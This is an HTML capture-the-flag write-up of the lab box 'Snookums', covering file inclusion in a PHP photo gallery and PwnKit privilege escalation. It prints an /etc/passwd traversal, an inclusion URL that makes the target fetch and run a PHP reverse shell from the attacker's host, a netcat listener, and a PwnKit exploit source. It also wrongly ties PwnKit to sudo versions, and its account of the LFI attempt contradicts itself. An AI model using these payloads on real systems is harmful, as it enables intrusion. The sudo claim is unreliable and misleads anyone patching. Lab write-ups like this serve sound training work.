@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snookums &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Snookums</h1>
+    <div class="meta">Target: <code>192.168.176.58</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">RFI</span><span class="tag">LFI</span><span class="tag">PwnKit</span><span class="tag">CVE-2021-4034</span><span class="tag">Apache</span><span class="tag">PHP</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#remote-file-inclusion-via-image-php">Remote File Inclusion via image.php</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#pwnkit-cve-2021-4034">PwnKit (CVE-2021-4034)</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Snookums is a Linux box that chains two well-known vulnerabilities: a Remote File Inclusion flaw in Simple PHP Photo Gallery v0.8 that hands over a shell as <code>apache</code>, followed by PwnKit (CVE-2021-4034) to escalate straight to root. The foothold is worth studying because the notes document trying the LFI variant first, confirming it worked, then pivoting to RFI once RFI was confirmed, a clean illustration of iterating through exploit variants.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<p>The host exposes a wide attack surface for a "simple" web box:</p>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.2   (anonymous login allowed)
+22/tcp   open  ssh     OpenSSH 7.4
+80/tcp   open  http    Apache httpd 2.4.6 (CentOS) PHP/5.4.16
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn  Samba smbd 4.10.4
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql        MySQL (unauthorized)
+</code></pre>
+<p>Anonymous FTP was open but timed out on directory listing, so HTTP was the path forward. The web title, "Simple PHP Photo Gallery", is the most useful data from the scan.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Gobuster against port 80:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.176.58/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+/css     (Status: 301)
+/images  (Status: 301)
+/js      (Status: 301)
+/photos  (Status: 301)
+</code></pre>
+<p>The landing page confirmed version <strong>Simple PHP Photo Gallery v0.8</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="remote-file-inclusion-via-image-php">Remote File Inclusion via image.php</h3>
+<p>Searching for that version number on ExploitDB turns up two relevant entries. The first (EDB-7786, LFI via <code>preview</code> parameter) didn't fire. The second, <strong>SimplePHPGal 0.7 Remote File Inclusion</strong> (EDB-48424), targets the <code>img</code> parameter in <code>image.php</code>.</p>
+<p>LFI proof of concept confirming the traversal works:</p>
+<pre><code>http://192.168.176.58/image.php?img=../../../../../../../etc/passwd
+</code></pre>
+<p>The <code>/etc/passwd</code> content rendered inline alongside the gallery, confirming file read. The output also revealed the local user <code>michael</code>, useful context for later.</p>
+<blockquote>
+<p><strong>Why LFI becoming RFI matters:</strong> an LFI vulnerability reads files from the local filesystem. An RFI vulnerability fetches a URL and executes the result as PHP. When a PHP application passes a user-supplied <code>img</code> parameter directly to an include-style function, remote URLs are often accepted too, the filter is usually on file extensions, not URL schemes. Because the server runs PHP, fetching a PHP reverse shell from an attacker-controlled host will cause the <em>server</em> to execute it on arrival.</p>
+</blockquote>
+<p>With RFI confirmed, I served <code>php-reverse-shell.php</code> from Kali over a Python HTTP server and triggered it through the vulnerable parameter:</p>
+<pre><code class="language-sh">python3 -m http.server 80
+</code></pre>
+<pre><code>http://192.168.176.58/image.php?img=http://192.168.45.244/php-reverse-shell.php
+</code></pre>
+<p>Port 139 was used for the listener (egress filtering required trial and error):</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 139
+connect to [192.168.45.244] from (UNKNOWN) [192.168.176.58] 52486
+uid=48(apache) gid=48(apache) groups=48(apache)
+$ whoami
+apache
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="pwnkit-cve-2021-4034">PwnKit (CVE-2021-4034)</h3>
+<p>LinPEAS flagged the sudo version:</p>
+<pre><code>Sudo version 1.8.23
+</code></pre>
+<p>Sudo 1.8.23 is vulnerable to <strong>CVE-2021-4034 (PwnKit)</strong>, a local privilege escalation in <code>pkexec</code> (part of polkit) that exploits an argument parsing bug to execute arbitrary code as root. The compiled C variant failed during on-target compilation, so the Python implementation was used instead:</p>
+<pre><code class="language-sh"># download from https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
+sh-4.2$ python pwn.py
+
+whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why the Python variant works when compilation fails:</strong> the Python exploit uses <code>ctypes</code> to call the same vulnerable <code>execve</code> path without needing a compiler on the target. On constrained systems (missing <code>gcc</code>, limited <code>/tmp</code> permissions) the Python version is the reliable fallback, and Python 2 was confirmed present via the <code>python</code> binary in PATH.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">cat proof.txt
+‹redacted›
+</code></pre>
+<p>Local flag was at <code>/home/michael/local.txt</code> (michael was the only non-service user in <code>/etc/passwd</code>).</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Check both LFI and RFI variants when file inclusion is suspected.</strong> The LFI confirmed traversal was possible; RFI converted that read-only primitive into code execution.</li>
+<li><strong>When compilation fails, reach for the Python exploit.</strong> <code>ctypes</code>-based PoCs sidestep the compiler dependency entirely.</li>
+<li><strong>Old sudo versions are low-hanging fruit.</strong> PwnKit affected every sudo &lt; 1.8.28; spotting the version in LinPEAS output is a one-second check.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
